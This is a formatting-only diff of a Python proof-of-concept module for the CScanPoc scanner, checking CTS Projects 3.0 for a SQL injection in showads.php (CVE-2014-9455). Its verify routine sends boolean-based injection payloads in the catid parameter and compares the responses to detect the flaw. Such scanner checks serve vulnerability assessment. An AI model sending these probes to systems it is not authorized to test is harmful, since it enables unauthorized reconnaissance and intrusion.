@@ -3,26 +3,28 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'CTSProjects_0101' # 平台漏洞编号
-    name = 'CTS Projects SQL注入' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    vuln_id = 'CTSProjects_0101'  # 平台漏洞编号
+    name = 'CTS Projects SQL注入'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-01-07'  # 漏洞公布时间
     desc = '''
     CTS Projects 是一个在线广告应用。
     CTS Projects showads.php脚本未正确过滤catid参数，允许远程攻击者利用漏洞提交特制的SQL查询，操作或获取数据库数据。
-    ''' # 漏洞描述
-    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2015-00130' # 漏洞来源
-    cnvd_id = 'CNVD-2015-00130' # cnvd漏洞编号
+    '''  # 漏洞描述
+    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2015-00130'  # 漏洞来源
+    cnvd_id = 'CNVD-2015-00130'  # cnvd漏洞编号
     cve_id = 'CVE-2014-9455'  # cve编号
     product = 'CTSProjects'  # 漏洞组件名称
     product_version = '3.0'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
-    poc_id = '7509139b-c305-4fe5-9842-4bffdb524090' # 平台 POC 编号
+    poc_id = '7509139b-c305-4fe5-9842-4bffdb524090'  # 平台 POC 编号
     author = 'hyhmnn'  # POC编写者
-    create_date = '2018-06-06' # POC创建时间
+    create_date = '2018-06-06'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -30,7 +32,7 @@ class Poc(ABPoc):
     def verify(self):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
-                    target=self.target, vuln=self.vuln))
+                target=self.target, vuln=self.vuln))
             paylaod = '/showads.php?catid=2 AND 2467=2467'
             paylaod1 = '/showads.php?catid=2 AND 2467=2468'
             url = self.target + paylaod
@@ -39,12 +41,13 @@ class Poc(ABPoc):
             response1 = requests.get(url)
             if response.text != response1.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                                target=self.target, name=self.vuln.name))
+                    target=self.target, name=self.vuln.name))
         except Exception, e:
             self.output.info('执行异常：{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
